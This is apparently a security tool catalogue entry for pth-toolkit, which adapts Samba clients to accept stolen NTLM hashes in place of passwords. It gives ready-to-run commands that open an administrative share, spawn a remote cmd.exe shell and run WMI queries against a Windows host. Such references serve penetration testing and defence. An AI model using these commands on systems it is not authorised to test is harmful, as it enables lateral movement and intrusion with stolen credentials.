---
name: "pth-toolkit"
categories:
  - blackarch-sniffer
version: "7.3641cdc"
homepage: "https://github.com/byt3bl33d3r/pth-toolkit"
packaged-by: [blackarch]
blackarch-builddate: "2018-11-14"
build-system: scripts
license: BSD
meta-checked: "2026-11-09"
github-repo: "byt3bl33d3r/pth-toolkit"
github-stars: 615
github-pushed: "2015-02-06"
github-archived: true
github-issues: 4
github-match: "exact"
gh-checked: "2026-11-07"
worth: 0.6
worth-basis: "historical (archived/gone upstream)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# pth-toolkit

> Prebuilt pass-the-hash clients: authenticate to Windows SMB/WMI services with an LM:NT hash instead of a password.

## What it's for

After dumping NTLM hashes, you want to use them from a Linux box without hand-patching and compiling Samba. byt3bl33d3r's pth-toolkit packages the classic "passing the hash" collection as ready-to-run amd64 binaries: `pth-net`, `pth-rpcclient`, `pth-smbclient`, `pth-smbget`, `pth-winexe`, `pth-wmic` and `pth-wmis`. In each tool the password part of the credential accepts the hashes in `LM:NT` (or `LM:NT:::`) form and the patched libraries substitute them into the NTLM exchange; everything else behaves like the stock Samba client of the same name. The toolkit is frozen at 2015-era binaries (Samba 4.0.x patch level): NTLM only — no Kerberos or AES — and modern Impacket equivalents (impacket-smbclient, impacket-psexec, impacket-wmiexec with `-hashes`) cover the same workflows against current systems.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Open an administrative share with a hash

smbclient semantics, hash authentication.

```
pth-smbclient -U 'DOMAIN/user%aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889' //198.51.100.10/c$
```

Outcome: an interactive `smb: \>` session on the target's administrative share, authenticated over NTLM with the supplied hash pair — substitute your own dumped `LM:NT` values (the constant above is the empty-LM placeholder). `pth-smbget` fetches files from a share non-interactively with the same credential syntax.

### Get a remote shell on a Windows host

winexe with hash credentials.

```
pth-winexe -U 'DOMAIN/user%aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889' //198.51.100.10 cmd.exe
```

Outcome: an interactive `cmd.exe` over SMB/DCERPC as the hashed user; `--system` runs it as LOCAL_SYSTEM, and `--reinstall`/`--uninstall` manage the remote service winexe installs to launch commands.

### Query WMI with a hash

wmic with hash credentials.

```
pth-wmic -U 'DOMAIN/user%aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889' //198.51.100.10 "select * from Win32_ComputerSystem"
```

Outcome: the WMI query results print as a table on stdout, same invocation shape as stock wmic with the hash in the password slot; `pth-wmis` instead executes a command blind via WMI.
